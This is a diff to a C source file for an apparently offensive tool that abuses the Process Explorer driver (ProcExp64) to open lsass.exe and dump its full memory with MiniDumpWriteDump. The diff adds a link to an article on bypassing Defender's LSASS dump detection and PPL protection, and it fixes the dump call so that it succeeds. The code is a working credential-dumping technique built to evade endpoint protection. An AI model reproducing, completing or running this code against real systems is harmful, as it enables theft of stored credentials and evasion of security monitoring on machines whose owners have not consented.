@@ -8,6 +8,9 @@ net start ProcExp64 / sc.exe start ProcExp64
 To cleanup unload the driver:
 net stop ProcExp64 / sc.exe stop ProcExp64
 sc.exe delete ProcExp64
+
+Good article explaining the method. The PPLBlade project gets detected by Defender even when sideloaded.
+https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6
 */
 
 #include <Windows.h>
@@ -171,7 +174,7 @@ int main(int argc, char** argv)
     // Dump lsass.exe with MiniDumpWriteDump
     if (!MiniDumpWriteDump(
         lsass_handle, // Handle obtained with the driver
-        lsass_pid,
+        0, // Must be zero, otherwise it will try to open its own handle and fail
         outfile,
         MiniDumpWithFullMemory,
         NULL,
